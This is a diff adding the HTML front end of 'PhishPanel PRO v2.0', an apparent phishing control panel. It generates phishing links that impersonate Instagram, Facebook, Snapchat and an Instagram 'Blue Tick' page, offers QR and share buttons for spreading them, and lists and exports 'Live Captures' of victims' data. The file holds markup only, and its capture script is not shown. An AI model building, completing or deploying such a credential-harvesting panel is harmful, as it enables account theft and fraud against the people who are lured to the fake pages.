@@ -1,1 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 PhishPanel PRO v2.0</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔥 PhishPanel PRO v2.0</h1>
+            <p>Ultimate Phishing Control Panel</p>
+        </header>
 
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalLinks">0</div>
+                <div class="stat-label">Links Created</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalCaptures">0</div>
+                <div class="stat-label">Live Captures</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activePages">4</div>
+                <div class="stat-label">Active Pages</div>
+            </div>
+        </div>
+
+        <!-- Link Generator -->
+        <div class="panel-card">
+            <h3>🎯 Generate Phishing Link</h3>
+            <select id="pageSelect">
+                <option value="instagram">📸 Instagram</option>
+                <option value="facebook">📘 Facebook</option>
+                <option value="snapchat">👻 Snapchat</option>
+                <option value="blue_tick">🔵 Instagram Blue Tick</option>
+            </select>
+            <button id="generateBtn">🚀 CREATE LINK</button>
+            
+            <div class="link-section hidden" id="linkSection">
+                <div class="link-input">
+                    <input type="text" id="phishLink" readonly placeholder="Your phishing link will appear here...">
+                    <button id="copyLinkBtn" title="Copy">📋</button>
+                </div>
+                <div class="link-actions">
+                    <button id="qrBtn" title="QR Code">📱</button>
+                    <button id="shareBtn" title="Share">🔗</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Logs -->
+        <div class="panel-card">
+            <div class="logs-header">
+                <h3>📊 LIVE CAPTURES</h3>
+                <div>
+                    <button id="clearBtn" title="Clear All">🗑️</button>
+                    <button id="exportBtn" title="Download JSON">💾</button>
+                </div>
+            </div>
+            <div class="logs-container" id="logsContainer">
+                <div class="no-logs">🎣 No captures yet... Share links!</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
